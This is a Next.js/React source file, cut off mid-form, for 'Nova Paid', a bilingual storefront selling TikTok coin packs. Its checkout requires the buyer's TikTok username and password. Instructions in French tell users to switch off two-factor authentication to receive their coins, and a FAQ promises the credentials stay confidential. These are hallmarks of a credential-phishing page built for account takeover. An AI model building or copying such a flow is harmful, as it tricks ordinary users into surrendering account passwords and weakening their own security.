"use client";

import Image from "next/image";
import {
  AlertCircle,
  ArrowLeft,
  ArrowRight,
  Check,
  ChevronRight,
  Clock3,
  Coins,
  CreditCard,
  Eye,
  EyeOff,
  Globe,
  Headphones,
  Info,
  LockKeyhole,
  Monitor,
  ShieldCheck,
  ShoppingBag,
  Sparkles,
  X,
} from "lucide-react";
import { FaWhatsapp } from "react-icons/fa";
import { useEffect, useRef, useState, useSyncExternalStore } from "react";
import {
  playError,
  playModalClose,
  playModalOpen,
  playPop,
  playStep,
  playTap,
  playToggle,
} from "@/app/lib/sound";
import { SoleasPayCheckoutV3 } from "@/app/components/payments/SoleasPayCheckoutV3";
import { WhatsAppContactPicker } from "@/app/components/support/WhatsAppContactPicker";
import { SupportQuickMenu } from "@/app/components/support/SupportQuickMenu";
import { VirtualCardsSection } from "@/app/components/cards/VirtualCardsSection";
import { getAssetPath } from "@/app/lib/asset-path";
import { packs, type Pack } from "@/app/lib/catalog";
import { SUPPORT_WHATSAPP_CONTACTS } from "@/app/lib/support-whatsapp";
import type { PaymentProvider } from "@/app/lib/payments/payment-contract";
import {
  ALL_COUNTRIES,
  POPULAR_COUNTRIES,
  detectUserCountry,
  dialCodes,
  formatFullPhoneNumber,
} from "@/app/lib/countries";

type Language = "fr" | "en";
type Theme = "light" | "dark";
type ProductMode = "cards" | "coins";

const PREFERENCE_CHANGE_EVENT = "nova-pay-preference-change";

function subscribeToPreferences(onStoreChange: () => void): () => void {
  window.addEventListener("storage", onStoreChange);
  window.addEventListener(PREFERENCE_CHANGE_EVENT, onStoreChange);

  return () => {
    window.removeEventListener("storage", onStoreChange);
    window.removeEventListener(PREFERENCE_CHANGE_EVENT, onStoreChange);
  };
}

function getLanguagePreference(): Language {
  const savedLanguage = window.localStorage.getItem("nova-pay-language");
  if (savedLanguage === "fr" || savedLanguage === "en") return savedLanguage;
  return window.navigator.language.toLowerCase().startsWith("fr") ? "fr" : "en";
}

function getThemePreference(): Theme {
  const savedTheme = window.localStorage.getItem("nova-pay-theme");
  if (savedTheme === "light" || savedTheme === "dark") return savedTheme;
  return window.matchMedia?.("(prefers-color-scheme: dark)").matches ? "dark" : "light";
}

function getStoredThemeSelection(): Theme | "system" {
  if (typeof window === "undefined") return "system";
  const savedTheme = window.localStorage.getItem("nova-pay-theme");
  return savedTheme === "light" || savedTheme === "dark" ? savedTheme : "system";
}

function savePreference(key: "nova-pay-language" | "nova-pay-theme", value: string): void {
  window.localStorage.setItem(key, value);
  window.dispatchEvent(new Event(PREFERENCE_CHANGE_EVENT));
}



const copy = {
  fr: {
    mainMenu: "Menu principal",
    brandLabel: "Nova Paid — Packs de pièces TikTok",
    products: "Nos produits",
    virtualCards: "Cartes virtuelles",
    tiktokCoins: "Pièces TikTok",
    languageSelector: "Choisir la langue",
    french: "Français",
    english: "Anglais",
    enableDark: "Activer le mode sombre",
    enableLight: "Activer le mode clair",
    themeSelector: "Choisir le thème",
    themeSystem: "Système",
    themeLight: "Clair",
    themeDark: "Sombre",
    enableSound: "Activer les sons d'interaction",
    muteSound: "Couper le son",
    sound: "Effets sonores",
    account: "Compte",
    purchasedCoins: "{count} pièces achetées",
    contactWhatsapp: "Contacter Nova Paid sur WhatsApp",
    menu: "Menu",
    close: "Fermer",
    rechargeCoins: "Recharger des pièces",
    myOrders: "Mes commandes",
    support: "Assistance et support",
    supportModalTitle: "Assistance & Support",
    supportSubtitle: "Besoin d'aide avec votre commande ou votre recharge ? Notre équipe est à votre disposition 7j/7.",
    supportBadge: "Service client",
    whatsappSupportTitle: "Support WhatsApp direct",
    onlineSupport: "En ligne 7j/7 · Réponse rapide",
    contactWhatsappBtn: "Discuter sur WhatsApp",
    faqTitle: "Questions fréquentes",
    faqDelivery: "Délai de réception des pièces",
    faqDeliveryAns: "Vos pièces TikTok sont créditées en 5 à 15 minutes dès confirmation du paiement.",
    faqSecurity: "Sécurité du compte",
    faqSecurityAns: "Vos identifiants sont strictement confidentiels et uniquement utilisés pour livrer votre recharge.",
    faqOrderIssue: "Commande en attente ou réclamation",
    faqOrderIssueAns: "Munissez-vous de votre référence de commande et contactez notre support sur WhatsApp.",
    videoBannerTitle: "Besoin d'aide pour acheter vos pièces ?",
    videoBannerSubtitle: "Regardez cette vidéo",
    videoModalTitle: "Besoin d'aide pour acheter vos pièces ?",
    watchVideo: "Regarder le tutoriel vidéo",
    rechargeTikTok: "Recharge TikTok",
    choosePack: "Choisissez votre pack",
    availablePacks: "Forfaits disponibles",
    pieces: "pièces",
    free: "Gratuites",
    standard: "Forfait standard",
    popular: "Populaire",
    creator: "Créateur",
    customAmount: "Montant personnalisé",
    customHint: "Minimum 70 pièces · Prix unitaire : 11.24 FCFA / pièce",
    removeCoins: "Retirer 70 pièces",
    customCoinCount: "Nombre de pièces personnalisé",
    addCoins: "Ajouter 70 pièces",
    estimatedTotal: "Total estimé",
    buy: "Acheter",
    buyNow: "Acheter maintenant",
    customPack: "Forfait personnalisé",
    minimumCoins: "Minimum 70 pièces",
    unitPrice: "Prix unitaire : 11.24 FCFA / pièce",
    totalToPay: "Total à payer :",
    orderHistory: "Historique des commandes",
    payment: "Paiement",
    date: "Date",
    onlinePayment: "Paiement en ligne",
    successful: "Réussie",
    failed: "Échouée",
    pending: "En attente",
    openOrder: "Ouvrir la transaction",
    noOrders: "Aucune commande pour le moment",
    nextOrder: "Vos transactions apparaîtront ici après votre première tentative de paiement.",
    progress: "Étape {current} sur {total}",
    rechargeInfo: "Informations de recharge",
    tiktokUsername: "Identifiant TikTok",
    password: "Mot de passe",
    country: "Pays",
    optional: "optionnel",
    required: "obligatoire",
    usernamePlaceholder: "pseudo ou email",
    usernameRequiredWarning: "Veuillez renseigner votre identifiant TikTok.",
    passwordRequiredWarning: "Veuillez saisir votre mot de passe (au moins 4 caractères).",
    whatsapp: "Numéro WhatsApp",
    whatsappHint: "Pour vous contacter en cas de besoin",
    whatsappPlaceholder: "6 00 00 00 00",
    whatsappRequiredWarning: "Veuillez renseigner un numéro WhatsApp valide.",
    emailAddress: "Adresse e-mail",
    emailPlaceholder: "client@exemple.com",
    emailRequiredWarning: "Veuillez renseigner une adresse e-mail valide avant de continuer.",
    confirmInstructions: "Je confirme avoir pris connaissance des instructions ci-dessus.",
    instructionsRequiredWarning: "Veuillez cocher la case pour confirmer que vous avez pris connaissance des instructions.",
    cancel: "Annuler",
    continue: "Continuer",
    back: "Retour",
    confirmOrder: "Confirmer la commande",
    orderAccount: "Compte",
    recharge: "Recharge",
    total: "Total",
    paymentMethod: "Paiement sécurisé",
    selectedProvider: "Prestataire sélectionné",
    chooseProvider: "Choisissez votre prestataire de paiement",
    recommended: "Recommandé",
    popularCountries: "Pays populaires",
    allCountries: "Tous les pays (A-Z)",
    footerDisclaimer: "Nova Paid est une plateforme indépendante de services tiers et n'est pas affiliée, associée ou sponsorisée par TikTok ou ByteDance.",
    footerCopyright: `© ${new Date().getFullYear()} Nova Paid. Tous droits réservés.`,
  },
  en: {
    mainMenu: "Main menu",
    brandLabel: "Nova Paid — TikTok coin packs",
    products: "Our products",
    virtualCards: "Virtual cards",
    tiktokCoins: "TikTok coins",
    languageSelector: "Choose language",
    french: "French",
    english: "English",
    enableDark: "Enable dark mode",
    enableLight: "Enable light mode",
    themeSelector: "Choose theme",
    themeSystem: "System",
    themeLight: "Light",
    themeDark: "Dark",
    enableSound: "Enable interaction sounds",
    muteSound: "Mute sounds",
    sound: "Sound effects",
    account: "Account",
    purchasedCoins: "{count} coins purchased",
    contactWhatsapp: "Contact Nova Paid on WhatsApp",
    menu: "Menu",
    close: "Close",
    rechargeCoins: "Recharge coins",
    myOrders: "My orders",
    support: "Help and support",
    supportModalTitle: "Help & Support",
    supportSubtitle: "Need help with your order or coin recharge? Our team is available 7 days a week.",
    supportBadge: "Customer service",
    whatsappSupportTitle: "Direct WhatsApp support",
    onlineSupport: "Online 7/7 · Fast response",
    contactWhatsappBtn: "Chat on WhatsApp",
    faqTitle: "Frequently Asked Questions",
    faqDelivery: "Coin delivery time",
    faqDeliveryAns: "Your TikTok coins are credited within 5 to 15 minutes after payment confirmation.",
    faqSecurity: "Account security",
    faqSecurityAns: "Your credentials are kept strictly confidential and only used to deliver your order.",
    faqOrderIssue: "Pending order or issue",
    faqOrderIssueAns: "Keep your order reference ready and reach out to our WhatsApp support team.",
    videoBannerTitle: "Need help buying your coins?",
    videoBannerSubtitle: "Watch this video",
    videoModalTitle: "Need help buying your coins?",
    watchVideo: "Watch tutorial video",
    rechargeTikTok: "TikTok recharge",
    choosePack: "Choose your pack",
    availablePacks: "Available packs",
    pieces: "coins",
    free: "free",
    standard: "Standard pack",
    popular: "Popular",
    creator: "Creator",
    customAmount: "Custom amount",
    customHint: "Minimum 70 coins · Unit price: 11.24 FCFA / coin",
    removeCoins: "Remove 70 coins",
    customCoinCount: "Custom number of coins",
    addCoins: "Add 70 coins",
    estimatedTotal: "Estimated total",
    buy: "Buy",
    buyNow: "Buy now",
    customPack: "Custom pack",
    minimumCoins: "Minimum 70 coins",
    unitPrice: "Unit price: 11.24 FCFA / coin",
    totalToPay: "Total to pay:",
    orderHistory: "Order history",
    payment: "Payment",
    date: "Date",
    onlinePayment: "Online payment",
    successful: "Successful",
    failed: "Failed",
    pending: "Pending",
    openOrder: "Open transaction",
    noOrders: "No orders yet",
    nextOrder: "Your transactions will appear here after your first payment attempt.",
    progress: "Step {current} of {total}",
    rechargeInfo: "Recharge information",
    tiktokUsername: "TikTok username",
    password: "Password",
    country: "Country",
    optional: "optional",
    required: "required",
    usernamePlaceholder: "your TikTok username",
    usernameRequiredWarning: "Please enter your TikTok username.",
    passwordRequiredWarning: "Please enter your password (at least 4 characters).",
    whatsapp: "WhatsApp number",
    whatsappHint: "So we can contact you about the order",
    whatsappPlaceholder: "6 00 00 00 00",
    whatsappRequiredWarning: "Please enter a valid WhatsApp number.",
    emailAddress: "Email address",
    emailPlaceholder: "customer@example.com",
    emailRequiredWarning: "Please enter a valid email address before continuing.",
    confirmInstructions: "I confirm that I have read the instructions above.",
    instructionsRequiredWarning: "Please check the box to confirm you have read the instructions above.",
    cancel: "Cancel",
    continue: "Continue",
    back: "Back",
    confirmOrder: "Confirm order",
    orderAccount: "Account",
    recharge: "Recharge",
    total: "Total",
    paymentMethod: "Secure payment",
    selectedProvider: "Selected provider",
    chooseProvider: "Choose your payment provider",
    recommended: "Recommended",
    popularCountries: "Popular countries",
    allCountries: "All countries (A-Z)",
    footerDisclaimer: "Nova Paid is an independent third-party service platform and is not affiliated with, associated with, or sponsored by TikTok or ByteDance.",
    footerCopyright: `© ${new Date().getFullYear()} Nova Paid. All rights reserved.`,
  },
} as const;

const localeFor = (language: Language) => language === "fr" ? "fr-FR" : "en-US";

const formatProgress = (template: string, current: number, total: number) =>
  template
    .replace("{current}", String(current))
    .replace("{total}", String(total));

const formatNumber = (value: number, language: Language) =>
  new Intl.NumberFormat(localeFor(language), { maximumFractionDigits: 2 }).format(value);

const formatPrice = (value: number, language: Language) =>
  formatNumber(value, language) + " FCFA";

const createPaymentOrderId = () =>
  `NOVA-${crypto.randomUUID().replace(/-/g, "").slice(0, 12).toUpperCase()}`;

export default function Home() {
  const language = useSyncExternalStore(
    subscribeToPreferences,
    getLanguagePreference,
    (): Language => "fr",
  );
  const theme = useSyncExternalStore(
    subscribeToPreferences,
    getThemePreference,
    (): Theme => "light",
  );
  const [selectedPack, setSelectedPack] = useState<Pack>(packs[2]);
  const [productMode, setProductMode] = useState<ProductMode>("cards");
  const [customCoins, setCustomCoins] = useState(0);
  const [checkoutOpen, setCheckoutOpen] = useState(false);
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [instructionsAccepted, setInstructionsAccepted] = useState(false);
  const [instructionsError, setInstructionsError] = useState(false);
  const [username, setUsername] = useState("");
  const [usernameError, setUsernameError] = useState(false);
  const usernameInputRef = useRef<HTMLInputElement>(null);
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState(false);
  const passwordInputRef = useRef<HTMLInputElement>(null);
  const [showPassword, setShowPassword] = useState(false);
  const [whatsapp, setWhatsapp] = useState("");
  const [whatsappError, setWhatsappError] = useState(false);
  const whatsappInputRef = useRef<HTMLInputElement>(null);
  const [countryCode, setCountryCode] = useState("CM");
  const [dialCode, setDialCode] = useState("+237");
  const [paymentOrderId, setPaymentOrderId] = useState("");
  const [paymentProvider, setPaymentProvider] = useState<PaymentProvider>("soleaspay");
  const [sideNavOpen, setSideNavOpen] = useState(false);
  const [themeMenuOpen, setThemeMenuOpen] = useState(false);
  const [supportOpen, setSupportOpen] = useState(false);
  const [videoModalOpen, setVideoModalOpen] = useState(false);
  const t = copy[language];

  useEffect(() => {
    document.documentElement.lang = language;
  }, [language]);

  useEffect(() => {
    document.documentElement.dataset.theme = theme;
    document.documentElement.style.colorScheme = theme;
  }, [theme]);

  useEffect(() => {
    let isMounted = true;
    void detectUserCountry()
      .then((detected) => {
        if (!isMounted || !detected) return;
        setCountryCode(detected.countryCode);
        setDialCode(detected.dialCode);
      })
      .catch(() => {
        // Geolocation is optional; never let a provider/network failure
        // create an unhandled rejection in the storefront.
      });
    return () => {
      isMounted = false;
    };
  }, []);

  const deliveredCoins = selectedPack.coins + (selectedPack.bonus ?? 0);
  const selectedCountry = ALL_COUNTRIES.find((country) => country.code === countryCode);

  const closeCheckout = () => {
    playModalClose();
    setCheckoutOpen(false);
    setStep(1);
    setInstructionsAccepted(false);
    setInstructionsError(false);
    setPaymentOrderId("");
    setUsernameError(false);
    setPasswordError(false);
    setWhatsappError(false);
    setPassword("");
    setShowPassword(false);
  };

  const openCheckout = () => {
    playModalOpen();
    setStep(1);
    setInstructionsAccepted(false);
    setInstructionsError(false);
    setPaymentOrderId("");
    setUsernameError(false);
    setPasswordError(false);
    setWhatsappError(false);
    setCheckoutOpen(true);
  };

  const selectPack = (pack: Pack) => {
    playTap();
    setSelectedPack(pack);
    setCustomCoins(0);
    setStep(1);
    setInstructionsAccepted(false);
    setInstructionsError(false);
    setPaymentOrderId("");
    setUsernameError(false);
    setPasswordError(false);
    setWhatsappError(false);
    setCheckoutOpen(true);
  };

  const updateCustomCoins = (value: number | string) => {
    const rawDigits = typeof value === "string" ? value.replace(/\D/g, "") : String(value).replace(/\D/g, "");
    const safeValue = rawDigits ? Math.min(1000000, parseInt(rawDigits, 10)) : 0;
    setCustomCoins(safeValue);
    playPop(safeValue >= 70 ? 1.1 : 0.9);

    if (safeValue >= 70) {
      setSelectedPack({
        id: "custom",
        coins: safeValue,
        price: Math.round(safeValue * 11.24),
      });
    } else if (selectedPack.id === "custom") {
      setSelectedPack({
        id: "custom",
        coins: safeValue,
        price: Math.round(safeValue * 11.24),
      });
    }
  };

  const handleNavigateSection = (sectionId: "packs") => {
    setSideNavOpen(false);
    if (checkoutOpen) {
      closeCheckout();
    }
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
  };

  useEffect(() => {
    document.body.style.overflow = checkoutOpen || sideNavOpen || supportOpen || videoModalOpen ? "hidden" : "";
    return () => {
      document.body.style.overflow = "";
    };
  }, [checkoutOpen, sideNavOpen, supportOpen, videoModalOpen]);

  useEffect(() => {
    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === "Escape") {
        if (sideNavOpen) setSideNavOpen(false);
        if (supportOpen) setSupportOpen(false);
        if (videoModalOpen) {
          playModalClose();
          setVideoModalOpen(false);
        }
        if (checkoutOpen) closeCheckout();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [sideNavOpen, supportOpen, videoModalOpen, checkoutOpen]);

  useEffect(() => {
    if (step === 2) {
      const timer = setTimeout(() => {
        usernameInputRef.current?.focus();
      }, 60);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const openPaymentStep = () => {
    setPaymentOrderId(createPaymentOrderId());
    setStep(3);
  };

  const handleStep1Continue = () => {
    if (!instructionsAccepted) {
      playError();
      setInstructionsError(true);
      return;
    }
    playStep(true);
    setInstructionsError(false);
    setStep(2);
  };

  const handleStep2Continue = () => {
    const isUsernameValid = username.trim().replace(/^@/, "").length >= 2;
    const isPasswordValid = password.length >= 4;
    const isWhatsappValid = whatsapp.replace(/\D/g, "").length >= 6;

    if (!isUsernameValid || !isPasswordValid || !isWhatsappValid) {
      playError();
      if (!isUsernameValid) setUsernameError(true);
      if (!isPasswordValid) setPasswordError(true);
      if (!isWhatsappValid) setWhatsappError(true);

      if (!isUsernameValid) {
        usernameInputRef.current?.focus();
      } else if (!isPasswordValid) {
        passwordInputRef.current?.focus();
      } else if (!isWhatsappValid) {
        whatsappInputRef.current?.focus();
      }
      return;
    }

    playStep(true);
    openPaymentStep();
  };

  const checkoutTotalSteps = 3;
  const progressLabel = formatProgress(t.progress, step, checkoutTotalSteps);

  return (
    <main className="store-page" data-theme={theme}>
      <header className="store-header">
        <div className="header-left">
          <a className="store-brand" href={productMode === "cards" ? "#cards" : "#packs"} onClick={() => playTap()} aria-label={t.brandLabel}>
            <Image src={getAssetPath("/novapaid-logo-96.png")} alt="Nova Paid" width={34} height={34} priority />
            <span className="brand-title" aria-hidden="true">Nova Paid</span>
          </a>
        </div>

        <div className="header-right">
          <button
            type="button"
            className="theme-toggle"
            onClick={() => setThemeMenuOpen((open) => !open)}
            aria-label={t.themeSelector}
            aria-expanded={themeMenuOpen}
            title={t.themeSelector}
          >
            <Monitor size={17} />
          </button>

          {themeMenuOpen && (
            <div className="theme-menu" role="menu" aria-label={t.themeSelector}>
              <button
                type="button"
                role="menuitemradio"
                aria-checked={getStoredThemeSelection() === "system"}
                onClick={() => {
                  playToggle(false);
                  window.localStorage.removeItem("nova-pay-theme");
                  window.dispatchEvent(new Event(PREFERENCE_CHANGE_EVENT));
                  setThemeMenuOpen(false);
                }}
              >
                {t.themeSystem}
              </button>
              <button
                type="button"
                role="menuitemradio"
                aria-checked={getStoredThemeSelection() === "light"}
                onClick={() => {
                  playToggle(theme === "dark");
                  savePreference("nova-pay-theme", "light");
                  setThemeMenuOpen(false);
                }}
              >
                {t.themeLight}
              </button>
              <button
                type="button"
                role="menuitemradio"
                aria-checked={getStoredThemeSelection() === "dark"}
                onClick={() => {
                  playToggle(theme === "light");
                  savePreference("nova-pay-theme", "dark");
                  setThemeMenuOpen(false);
                }}
              >
                {t.themeDark}
              </button>
            </div>
          )}

          <button
            type="button"
            className="lang-switcher"
            onClick={() => {
              playToggle(language === "en");
              savePreference("nova-pay-language", language === "fr" ? "en" : "fr");
            }}
            aria-label={language === "fr" ? t.english : t.french}
            title={language === "fr" ? t.english : t.french}
          >
            <Globe size={14} aria-hidden="true" />
            <span className={language === "fr" ? "active" : ""}>FR</span>
            <span className={language === "en" ? "active" : ""}>EN</span>
          </button>

        </div>
      </header>

      {sideNavOpen && (
        <div className="sidenav-overlay">
          <button
            type="button"
            className="sidenav-backdrop"
            onClick={() => {
              playModalClose();
              setSideNavOpen(false);
            }}
            aria-label={t.close}
          />
          <nav className="sidenav-drawer" aria-label={t.mainMenu}>
            <div className="sidenav-header">
              <span className="sidenav-title">{t.menu}</span>
              <button
                type="button"
                onClick={() => {
                  playModalClose();
                  setSideNavOpen(false);
                }}
                aria-label={t.close}
              >
                <X size={18} />
              </button>
            </div>
            <div className="sidenav-links">
              <button
                type="button"
                className={`sidenav-link${!supportOpen ? " active" : ""}`}
                onClick={() => {
                  playTap();
                  handleNavigateSection("packs");
                }}
              >
                <ShoppingBag size={18} />
                <span>{t.rechargeCoins}</span>
              </button>
              <button
                type="button"
                className={`sidenav-link${supportOpen ? " active" : ""}`}
                onClick={() => {
                  setSideNavOpen(false);
                  playModalOpen();
                  setSupportOpen(true);
                }}
              >
                <Headphones size={18} />
                <span>{t.support}</span>
              </button>
            </div>
          </nav>
        </div>
      )}

      <div className="product-mode-shell">
        <div className="product-mode-label">{t.products}</div>
        <div className="product-mode-switch" role="tablist" aria-label={t.products}>
          <button
            type="button"
            role="tab"
            aria-selected={productMode === "cards"}
            className={productMode === "cards" ? "active" : ""}
            onClick={() => { playToggle(productMode === "coins"); setProductMode("cards"); }}
          >
            <CreditCard size={17} /> {t.virtualCards}
          </button>
          <button
            type="button"
            role="tab"
            aria-selected={productMode === "coins"}
            className={productMode === "coins" ? "active" : ""}
            onClick={() => { playToggle(productMode === "cards"); setProductMode("coins"); }}
          >
            <Coins size={17} /> {t.tiktokCoins}
          </button>
        </div>
      </div>

      {productMode === "cards" ? (
        <VirtualCardsSection language={language} />
      ) : (
      <section className="shop-shell" id="packs">
        <div className="help-video-banner">
          <div className="help-video-banner-left">
            <div className="help-video-title-row">
              <span className="help-video-dot" aria-hidden="true" />
              <h2>{t.videoBannerTitle}</h2>
            </div>
            <p>{t.videoBannerSubtitle}</p>
          </div>

          <button
            type="button"
            className="help-video-trigger"
            onClick={() => {
              playModalOpen();
              setVideoModalOpen(true);
            }}
            aria-label={t.watchVideo}
          >
            <Image
              src="https://img.youtube.com/vi/AZgaA8ufCzs/maxresdefault.jpg"
              alt={t.videoBannerTitle}
              className="help-video-thumbnail"
              fill
              sizes="(max-width: 760px) 100vw, 360px"
              unoptimized
              onError={(e) => {
                (e.currentTarget as HTMLImageElement).src =
                  "https://img.youtube.com/vi/AZgaA8ufCzs/hqdefault.jpg";
              }}
            />
            <div className="help-video-overlay" />
            <div className="help-video-play-btn" aria-hidden="true">
              <svg
                viewBox="0 0 24 24"
                fill="currentColor"
                className="help-video-play-icon"
                width="18"
                height="18"
              >
                <path d="M8 5v14l11-7z" />
              </svg>
            </div>
          </button>
        </div>

        <div className="shop-titlebar">
          <div>
            <h1>{t.choosePack}</h1>
          </div>
        </div>

        <div className="shop-layout">
          <div className="catalogue">
            <div className="pack-grid" role="radiogroup" aria-label={t.availablePacks}>
              {packs.map((pack) => {
                const active = selectedPack.id === pack.id;
                const badge = pack.badge ? t[pack.badge] : null;

                return (
                  <button
                    type="button"
                    className={"pack-card" + (active ? " selected" : "") + (badge ? " has-badge" : "")}
                    key={pack.id}
                    onClick={() => selectPack(pack)}
                    role="radio"
                    aria-checked={active}
                  >
                    {badge && <span className="pack-badge">{badge}</span>}
                    <div className="pack-topline">
                      <div className="pack-identity">
                        <div className="coin-emblem"><Coins size={19} /></div>
                        <div>
                          <span>TikTok</span>
                          <strong>Coins</strong>
                        </div>
                      </div>
                      <strong className="pack-quantity">{formatNumber(pack.coins, language)}</strong>
                    </div>

                    <div className={"pack-details" + (pack.bonus ? " has-bonus" : "")}>
                      <strong>{formatPrice(pack.price, language)}</strong>
                      {pack.bonus ? (
                        <div className="pack-bonus-line">
                          <span><Sparkles size={12} /> +{formatNumber(pack.bonus, language)} {t.free}</span>
                          <em>+10%</em>
                        </div>
                      ) : (
                        <div className="pack-bonus-line standard">{t.standard}</div>
                      )}
                    </div>

                    <span className="pack-buy-action">
                      {t.buyNow} <ArrowRight size={14} />
                    </span>
                  </button>
                );
              })}
            </div>

            <div className={"custom-card" + (selectedPack.id === "custom" ? " selected" : "")}>
              <div className="custom-heading">
                <div className="coin-emblem"><Coins size={19} /></div>
                <div>
                  <strong>{t.customAmount}</strong>
                  <span>{t.customPack}</span>
                </div>
              </div>

              <div className="custom-minimum">
                <span>{t.minimumCoins}</span>
                <Coins size={13} />
              </div>

              <div className="custom-input-area">
                <div className="custom-input-line">
                  <input
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={customCoins || ""}
                    onKeyDown={(event) => {
                      if (
                        [
                          "Backspace",
                          "Delete",
                          "Tab",
                          "Escape",
                          "Enter",
                          "ArrowLeft",
                          "ArrowRight",
                          "Home",
                          "End",
                        ].includes(event.key) ||
                        event.ctrlKey ||
                        event.metaKey
                      ) {
                        return;
                      }
                      if (!/^[0-9]$/.test(event.key)) {
                        event.preventDefault();
                      }
                    }}
                    onChange={(event) => {
                      const cleaned = event.target.value.replace(/\D/g, "");
                      updateCustomCoins(cleaned);
                    }}
                    onPaste={(event) => {
                      const pastedText = event.clipboardData.getData("text");
                      const cleaned = pastedText.replace(/\D/g, "");
                      if (!/^\d+$/.test(pastedText)) {
                        event.preventDefault();
                        if (cleaned) {
                          updateCustomCoins(cleaned);
                        }
                      }
                    }}
                    placeholder="70"
                    aria-label={t.customCoinCount}
                  />
                  <span>{t.pieces}</span>
                </div>
                <small><Coins size={11} /> {t.unitPrice}</small>
              </div>

              <div className="custom-total-row">
                <span>{t.totalToPay}</span>
                <strong>{customCoins >= 70 ? formatPrice(selectedPack.price, language) : "—"}</strong>
              </div>

              <button
                type="button"
                className="custom-buy-wide"
                onClick={openCheckout}
                disabled={customCoins < 70}
              >
                {t.buyNow} <ArrowRight size={15} />
              </button>
            </div>

          </div>
        </div>
      </section>
      )}

      <footer className="store-footer">
        <div className="store-footer-inner">
          <p className="store-footer-disclaimer">{t.footerDisclaimer}</p>
          <div className="store-footer-bottom">
            <span>{t.footerCopyright}</span>
          </div>
        </div>
      </footer>

      {checkoutOpen && (
        <div
          className="checkout-overlay"
          role="presentation"
          onMouseDown={(event) => event.target === event.currentTarget && closeCheckout()}
        >
          <section className="checkout-panel" role="dialog" aria-modal="true" aria-labelledby="checkout-title">
            <button type="button" className="close-checkout" onClick={closeCheckout} aria-label={t.close}>
              <X />
            </button>

            <div className="checkout-progress" aria-label={progressLabel}>
              {Array.from({ length: checkoutTotalSteps }, (_, index) => (
                <span className={step >= index + 1 ? "active" : ""} key={index} />
              ))}
            </div>

            {step === 1 && (
              <div className="checkout-step step-instructions">
                <div className="instructions-header">
                  <span className="modal-kicker">{formatProgress(t.progress, 1, checkoutTotalSteps)}</span>
                  <h2 id="checkout-title">Instructions importantes</h2>
                  <p className="instructions-intro">Veuillez lire attentivement avant de continuer</p>
                </div>

                <div className="instruction-cards">
                  <div className="instruction-card">
                    <div className="instruction-card-icon"><ShieldCheck size={20} /></div>
                    <div>
                      <strong>Identifiants TikTok requis</strong>
                      <p>Veuillez vous assurer que vous disposez de vos identifiants TikTok corrects (nom d&apos;utilisateur et mot de passe) pour recevoir vos pièces.</p>
                    </div>
                  </div>

                  <div className="instruction-card warning">
                    <div className="instruction-card-icon"><Info size={20} /></div>
                    <div>
                      <strong>Authentification à deux facteurs (2FA)</strong>
                      <p>Si vous avez activé l&apos;authentification à deux facteurs sur votre compte TikTok, veuillez la désactiver temporairement le temps de recevoir vos pièces.</p>
                    </div>
                  </div>
                </div>

                <label className={`terms-check${instructionsError ? " terms-check-error" : ""}`}>
                  <input
                    type="checkbox"
                    checked={instructionsAccepted}
                    onChange={(event) => {
                      const isChecked = event.target.checked;
                      playToggle(isChecked);
                      setInstructionsAccepted(isChecked);
                      if (instructionsError && isChecked) {
                        setInstructionsError(false);
                      }
                    }}
                  />
                  <span><Check size={13} /></span>
                  {t.confirmInstructions}
                </label>

                {instructionsError && (
                  <div className="field-error-notice" role="alert">
                    <AlertCircle size={13} />
                    <span>{t.instructionsRequiredWarning}</span>
                  </div>
                )}

                <div className="instructions-actions">
                  <button type="button" className="modal-secondary" onClick={closeCheckout}>{t.cancel}</button>
                  <button
                    type="button"
                    className="modal-primary"
                    onClick={handleStep1Continue}
                  >
                    {t.continue} <ArrowRight size={18} />
                  </button>
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="checkout-step step-form">
                <button
                  type="button"
                  className="back-button"
                  onClick={() => {
                    playStep(false);
                    setStep(1);
                  }}
                >
                  <ArrowLeft size={15} /> {t.back}
                </button>

                <div className="form-header">
                  <div>
                    <span className="modal-kicker">{formatProgress(t.progress, 2, checkoutTotalSteps)}</span>
                    <h2 id="checkout-title">{t.rechargeInfo}</h2>
                  </div>
                  <div className="form-header-pack">
                    <span>{formatNumber(deliveredCoins, language)}</span> {t.pieces} · <strong>{formatPrice(selectedPack.price, language)}</strong>
                  </div>
                </div>

                <div className="fields-row">
                  <label className="field-label">
                    <span>{t.tiktokUsername} <span className="required">*</span></span>
                    <div className={`field${usernameError ? " field-error" : ""}`}>
                      <span>@</span>
                      <input
                        ref={usernameInputRef}
                        value={username}
                        onChange={(event) => {
                          const val = event.target.value.replace(/^@/, "");
                          setUsername(val);
                          if (usernameError && val.trim().length >= 2) {
                            setUsernameError(false);
                          }
                        }}
                        onBlur={() => {
                          if (username.trim().replace(/^@/, "").length < 2) {
                            setUsernameError(true);
                          }
                        }}
                        placeholder={t.usernamePlaceholder}
                        autoComplete="off"
                      />
                    </div>
                    {usernameError && (
                      <div className="field-error-notice" role="alert">
                        <AlertCircle size={13} />
                        <span>{t.usernameRequiredWarning}</span>
                      </div>
                    )}
                  </label>
                  <label className="field-label">
                    <span>{t.password} <span className="required">*</span></span>
                    <div className={`field field-password${passwordError ? " field-error" : ""}`}>
                      <span><LockKeyhole size={16} /></span>
                      <input
                        ref={passwordInputRef}
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(event) => {
                          const val = event.target.value;
                          setPassword(val);
                          if (passwordError && val.length >= 4) {
                            setPasswordError(false);
                          }
                        }}
                        onBlur={() => {
                          if (password.length < 4) {
                            setPasswordError(true);
                          }
                        }}
                        placeholder="••••••••"
                        autoComplete="current-password"
                      />
                      <button
                        type="button"
                        className="toggle-password"
                        onClick={() => {
                          playToggle(!showPassword);
                          setShowPassword(!showPassword);
                        }}
                        aria-label={showPassword ? (language === "fr" ? "Masquer le mot de passe" : "Hide password") : (language === "fr" ? "Afficher le mot de passe" : "Show password")}
                      >
                        {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                      </button>
                    </div>
                    {passwordError && (
                      <div className="field-error-notice" role="alert">
                        <AlertCircle size={13} />
                        <span>{t.passwordRequiredWarning}</span>
                      </div>
                    )}
                  </label>
                </div>

                <label className="field-label">
                  <span>
